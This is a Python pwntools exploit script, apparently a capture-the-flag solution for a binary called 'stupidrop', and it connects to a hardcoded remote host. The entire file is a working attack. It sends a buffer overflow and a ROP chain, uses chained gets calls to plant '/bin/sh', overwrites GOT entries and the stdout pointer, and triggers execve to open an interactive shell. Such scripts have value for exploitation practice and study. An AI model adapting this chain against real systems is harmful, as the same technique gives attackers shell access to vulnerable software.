#!/usr/bin/python
from pwn import *
import sys

HOST = "104.196.127.247"
PORT = 5555

POPRDI = 0x00000000004006a3
POPRBP = 0x0000000000400560
SYSCALL = 0x000000000040063e
RET = 0x0000000000400289
POPR12131415 = 0x000000000040069c

CALLGAD = 0x400680

def read_into(address):
	result = p64(POPRDI)
	result += p64(address)
	result += p64(e.plt["gets"])

	return result

def exploit(r):
	payload = "A"*56	
	payload += read_into(0x6010b0)			# store /bin/sh
	payload += read_into(0x601130)  		# store ptr to SYSCALL
	payload += read_into(e.got["setvbuf"])  # overwrite setvbuf
	payload += read_into(0x601048)			# overwrite stdout ptr
	payload += read_into(e.got["alarm"])	# overwrite alarm

	payload += p64(POPRDI)
	payload += p64(0x601500)
	payload += p64(0x4005fe)		# execute 'rax update'
	payload += p64(POPR12131415)
	payload += p64(0x601130)		# ptr to syscall
	payload += p64(0x0)	
	payload += p64(0x0)
	payload += p64(0x6010b0)		# /bin/sh
	payload += p64(CALLGAD)			# call execution gadget
	
	r.sendline(payload)
	
	# Send the data to answer the gets-calls from the ropchain
	r.sendline("/bin/sh\x00")		# store /bin/sh on bss
	r.sendline(p64(SYSCALL))		# store ptr to syscall
	r.sendline(p64(RET))			# overwrite setvbuf with ret
	r.sendline(p64(59))				# overwrite stdout with execve syscall no
	r.sendline(p64(POPRBP))			# overwrite alarm with popret

	# enjoy shell
	
	r.interactive()
	
	return

if __name__ == "__main__":
	e = ELF("./stupidrop")

	if len(sys.argv) > 1:
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./stupidrop")
		print util.proc.pidof(r)
		pause()
		exploit(r)
